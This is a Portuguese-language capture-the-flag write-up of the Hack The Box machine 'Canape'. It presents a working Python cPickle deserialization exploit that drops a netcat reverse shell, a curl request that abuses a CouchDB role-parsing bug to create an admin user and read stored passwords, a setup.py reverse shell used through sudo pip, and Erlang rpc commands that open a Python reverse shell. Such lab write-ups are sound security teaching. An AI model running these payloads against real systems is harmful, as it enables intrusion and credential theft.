---
title: "Hack The Box - Canape"
tags: [Linux,Medium,Gobuster,Wfuzz,Deserialization,Linpeas]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/134>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos apenas uma porta aberta no servidor

> Porta 80 - Servidore Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_web.png)

### Gobuster na porta 80

Então rodamos o Gobuster na página pra ver se conseguimos algo nela

gobuster dir -u http://10.10.10.70 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_gobuster.png)

Explicação parâmetros

> dir --> modo discover

> -w --> wordlist utilizada

> -t 50 --> aumentar as threads para ir mais rápido

Ué, erro bizarro no gobuster, possivelmente algum tipo de proteção, então vamos usar o wfuzz com algumas flags ativadas

### Wfuzz na porta 80

wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 --hh 3076 --hw 1 http://10.10.10.70/FUZZ

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_wfuzz.png)

Explicação parâmetros

> --hc 404 -> esconder os erros 404

> --hh 3076 -> caso a página tenha tamanho 3076 não vai mostrar

> --hw 1 -> caso a página tinha 1 palavra não vai mostrar

## Enumeração GIT

Verificamos no nmap que ele passou que esse servidor possui um repositório git nele, então vamos verificar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_git.png)

Bom, sempre que vemos um repositório git é importante olharmos o arquivo de configuração, pra a partir dele tentar baixar esse repositório na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_config1.png)

Ai está o link `http://git.canape.htb/simpsons.git`

Então, tentamos clonar o repositório

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_config.png)

Obviamente não deu pq minha máquina não consegue resolver o endereço git.canape.htb, devemos adicioná-la ao /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_hosts.png)

Agora tentamos clonar novamente o repositório e conseguimos baixar ele na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_config2.png)

# Explorando Git

Agora a ideia é procurar tudo qeue possa vulnerável... uma ideia de onde começar é verificando o histórico de commits que o usuário vez

`git log`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_git1.png)

Encontramos esse que se mostrou muito interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_git2.png)

Com o comando `git diff` verificamos o que tem de diferente no commit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_git4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_git3.png)

Bom, duas coisas me chamaram a atenção quando vi isso, a questão de ele utilizar o `Pickles` para desseralização de classes Python e o `Flask`

Agora vamos tentar montar um exploit para explorar isso, uma vez que temos todo o código fonte que foi utilizado para fazer a página, tudo que está descrito aqui é um apanhando do `Ippsec` e do `0xdf`, dos quais vendo os vídeos/write-ups deles, consegui entender e reproduzir aqui

## Exploração Pickles e Flask

Primeiro passo é verificar se o o seu Python consegue importar o cPickle, para isso apenas abra um Python interativo e de `import cPickle`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_p.png)

Pronto, podemos desenvolver o exploit agora, uma vez que eu consigo importar o Pickles, sem problemas

Uma vez que possuimos todo o código fonte da aplicação naquele git que pegamos, podemos inicializar ele para testar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_e.png)

Bom, temos que instalar o couchdb também, mas não vou instalar aqui (realmente pq não vai ser tão simples, e acho que não vou dar conta de botar pra funcionar) O que vamos fazer é remover tudo que for referente a couchdb, uma vez que não vamos utilizar ela por hora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a1.png)

Agora iniciamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a3.png)

Show, agora podemos iniciar a brincar, aqui vou tentar se o mais explicativo possível, desserealização pra mim ainda é muito complexo. Fiz algumas máquinas já que envolviam esse tipo de ataque, mas em python é a primeira

Importamos as bibliotecas python que por hora iremos utilizar

exploit.py
```
import os
import cPickle
import requests
```

O pickles é utilizado para de/serelização de objetos em python, então, consequentemente devemos criar um objeto e uma classe para ser enviado para ele

exploit.py
```
import os
import cPickle
import requests

class exploit(object):
    def __reduce__(self)
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f,))
```

O que essa reduce faz? Vamos pesquisar... ela vai reduzir a um único valor todo o comando, senão não vamos conseguir serializar com o pickle

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a4.png)

Agora com a classe e objeto criados. Ele vai chamar a função os.system, e executar os comandos, um deles é um shell reverso, agora devemos passar pro pickle fazer isso

exploit.py
```
import os
import cPickle
import requests

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f',))
sc = cPickle.dumps(exploit())
print sc
```

O que é dumps()? Ai está a explicação. Temos que fazer isso pra poder criar uma representação de string do objeto

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a6.png)

Vamos ver como está se saindo, saída é bizarra, mas não deu erro pelo menos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a5.png)

Vamos continuar então, agora devemos ver pra onde temos que enviar essa bagaça toda, pra isso vamos voltar lá no diff pra ver o que a aplicação "vulnerável" está fazendo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_check.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_submit.png)

Está alterando o /submit e o /check, possivelmente ai está nossos pontos de exploração

Explicação do /submit

Verificando o que ele está fazendo, ao invés de ser enviado o 'quote' para o cPickle, ele está sendo enviado para um arquivo que está em hash md5. Ou seja, se todos os caracteres estiverem em uma whitelist (lowercase) são enviados para serem processados em md5

`p_id = md5(char + quote).hexdigest()`

Hum... qual a ideia aqui agora então? É abrir um arquivo cujo p_id é um hash md5 das variáveis char e quote, tendo isso em mente adaptamos nosso exploit

exploit.py
```
import os
import cPickle
import requests
from hashlib import md5

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f',))
sc = cPickle.dumps(exploit())
# print sc

char,quote = sc.split("!")

print "[+] ---------- Dividindo Ambos ---------- [+]"
print char
print "[+] ---------- Reverse Shell ---------- [+]"
print quote
```

Executando...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a7.png)

Agora que sabemos que ele está dividindo e printando o comando, adicionamos o p_id para ele fazer um md5 no char e no quote e carregamos ele no cPickle, pra ele fazer a serialização (e como sabemos que serializações sempre são problema, vamos ver o que temos)

```
import os
import cPickle
import requests
from hashlib import md5

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f',))
sc = cPickle.dumps(exploit())
# print sc

char,quote = sc.split("!")

p_id = md5(char+quote).hexdigest()
cPickle.loads(char+quote)
```

Testamos na nossa máquina, e vemos que deu certo.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a8.png)

Agora devemos alterar de acordo com o que está na requisição do site, para isso vamos verificar com o BurpSuite como estão os dados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a10.png)

`character=TESTE&quote=TESTE`

Show... vamos adaptar o exploit então

```
import os
import cPickle
import requests
from hashlib import md5

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f',))
sc = cPickle.dumps(exploit())
# print sc

char,quote = sc.split("!")

p_id = md5(char+quote).hexdigest()
requests.post("http://127.0.0.1:5000/submit", data={'character': char, 'quote': quote})
```

Agora vamos ver o /check, o que é feito nele

```
     path = "/tmp/" + request.form["id"] + ".p"
-    item = cPickle.load(open(path, "rb"))
+    data = open(path, "rb").read()
+
+    if "p1" in data:
+        item = cPickle.loads(data)
+    else:
+        item = data

```

É isso, ele carrega o submit no pickles, ai que está a malícia, quando ele carrega, tem um comando nosso ali, ele desserializa e executa!

Então enviamos o "id" como "p_id", show! Atualizamos o exploit

exploit.py

```
import os
import cPickle
import requests
from hashlib import md5

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f',))
sc = cPickle.dumps(exploit())
# print sc

char,quote = sc.split("!")

p_id = md5(char+quote).hexdigest()
requests.post("http://127.0.0.1:5000/submit", data={'character': char, 'quote': quote})
requests.post("http://127.0.0.1:5000/check", data={'id': p_id})
```

Executamos e ganhamos uma shell na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a12.png)

Agora mudamos o endereço para ser da máquina Canape

## Ganhando Reverse Shell na Canape

exploit.py
```
import os
import cPickle
import requests
from hashlib import md5

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.117 443 >/tmp/f',))
sc = cPickle.dumps(exploit())
# print sc

char,quote = sc.split("!")

p_id = md5(char+quote).hexdigest()
requests.post("http://10.10.10.70/submit", data={'character': char, 'quote': quote})
requests.post("http://10.10.10.70/check", data={'id': p_id})
```

Show! Temos um shell de `www-data`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_a11.png)

# Escalação de privilégio www-data -> Homer

Rodamos o linpeas para procurar por pontos de escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_linpeas0.png)

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_linpeas.png)

Rodamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_linpeas1.png)

Encontramos algo "estranho" sendo executado como root... é o couchdb

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_linpeas2.png)

Então verificamos nos serviços que estão sendo executados do que se trata, tem algo na porta 5984 rodando localmente! E essa é a porta do couchdb

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_priv.png)

## Explorando couchdb

Procurando pro exploits para Couchdb v2.0.0 encontramos alguns

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_searchsploit.png)

Procurando na internet encontramos algo melhor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co.png)

> https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co1.png)

Iremos fazer de acordo com o que está descrito no blog acima

A ideia aqui é criar um usuário no banco de dados (administrador) e com esse usuário realizar as consultas que queremos fazer, parece simples, por que realmente é simples!

Mas por que funciona? A ideia do exploit é pq ele passa dois dados para a variável roles, o JavaScript do CouchDB apenas vê o segundo, e como está vazio ele aceita. O Erlang (que é um parser de json) verifica os dois, e mantém dos dois, nos tornando administradores (de grosso modo é isso)

No blog ele da exatamente como deve ser a requisição POST

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co2.png)

Adaptamos no nosso caso e enviamos

```
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:canape' --data-binary '{
  "type": "user",
  "name": "canape",
  "roles": ["_admin"],
  "roles": [],
  "password": "password"
}'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co3.png)

Agora temos o usuário canape no banco de dados, e assim podemos fazer todas as requisições que quisermos, vamos verificar todas as dbs que tem no sistema (pra isso não precisa da autenticação)

`curl http://localhost:5984/_all_dbs`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co4.png)

Vamos tentar ver essa `passwords` que certamente é interessante

`curl http://localhost:5984/passwords`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co5.png)

Não temos acesso! Ai que entra a autenticação que fizemos antes!

`curl --user 'canape:password' 127.0.0.1:5984/passwords/`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co6.png)

Vizualizamos todos eles

`curl --user 'canape:password' 127.0.0.1:5984/passwords/_all_docs`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_co7.png)

Olhando um a um encontramos a senha de homer que possui shell válido na máquina

```
curl --user 'canape:password' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
curl --user 'canape:password' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
curl --user 'canape:password' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
curl --user 'canape:password' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_pass.png)

Hummm... analisando as senhas encontradas uma nos chamou atenção, a `0B4jyA0xtytZi7esBNGp` que diz no item SSH... vamos ver quais usuários temos na máquina pra tentar o acesso SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_ssh.png)

Usuário homer! Agora é só logar com ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_ssh1.png)

Outras maneiras de explorar esse couchdb será explicado no final do artigo...

# Escalação Privilégio Homer --> Root

Agora vamos escalar privilégio para root, com o comando `sudo -l` descobrimos que o usuário pode fazer pip install como se root fosse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_s.png)

Agora ficou simples para escalar privilégio

## 1º Modo - gtfobins

> https://gtfobins.github.io/gtfobins/pip/#sudo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_s1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_s2.png)

Ta beleza, conseguimos, mas vamos entender melhor, e fazer manual a parada... mais proveitoso pro conhecimento

## 2º Modo - manual

A ideia aqui é criar um "programa" em python, que na bucha seja um reverse shell pra nossa máquina. O pip por padrão vai procurar o arquivo setup.py na pasta que eu direcionar para realizar a instalação do pacote (pip é pra instalar pacotes em python)

Então, fazemos nosso `setup.py`

setup.py
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.117",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_s3.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_user.png)

# Outros modos de se explorar o CouchDB

Agora vamos ver outras maneiras de se explorar o couchdb

Lendo um pouco mais sobre como funciona o couchdb verificamos outros pontos que podemos explorar (créditos ao 0xdf)

> https://docs.couchdb.org/en/stable/setup/cluster.html

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d.png)

Essa porta 4369 que ele fala que podemos explorar não aparece quando executamos como homer nem como www-data, mas quando executamos como root o `netstat -nlpt` ela aparece

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d1.png)

Sendo assim, sabemos que ela está sendo disponibilizada... Qual a ideia aqui? Ele diz na imagem acima, que quando essa porta 4369 está habilitada, o couchdb está funcionando em modo cluster, a única coisa que protege a aplicação é o cookie dele... e o cookie nós conseguimos pegar! Como? No próprio processo da aplicação tem descrito o cookie (setcookie)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d2.png)

Então seguindo essa ideia se conseguirmos reproduzir o cookie "monster" vamos ter acesso ao banco de dados, e como ele está sendo executado como homer, vamos ter acesso a RCE como homer

We can connect to epmd with erl, The Erlang Emulator. We need to give it two parameters. -sname can be anything, just what we are known as in the cluster. -setcookie is the auth from the warning on the CouchDB site. erl throws an error if our HOME variable isn’t set, but that’s easy enough to fix:

Nós podemos nos conectar ao `epmd` com o `erl`. É aquele parser de json que nos permite virar admin. Nós precisamos passar dois comandos, -sname, que pode ser qualquer cosia. E o -setcookie que é o que diz que é perigoso no site.

Pronto, nos conectamos ao banco de dados!

`erl -sname Couch -setcookie monster`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d3.png)

O erl possui um módulo de execução de comandos de sistema operacional... puuuts, agora sim!

> http://erlang.org/doc/man/os.html

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d4.png)

O erl possui outro módulo também chamado rpc, que podemos executar comandos através dos processos do couchdb (lembra que tinha processos sendo executados como homer... então!)

> http://erlang.org/doc/man/rpc.html

Checamos nosso nodes que estão sendo usados agora, e está vazio

`nodes()`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d5.png)

Quando nos fazemos uma chamada rpc, ele vai executar o comando, assumindo que o cookie deu match!

`rpc:call('couchdb@localhost', os, cmd, [whoami]).`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d6.png)

Pronto, agora é só pegar uma reverse!

```
rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.117\", 443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-canape/C_d7.png)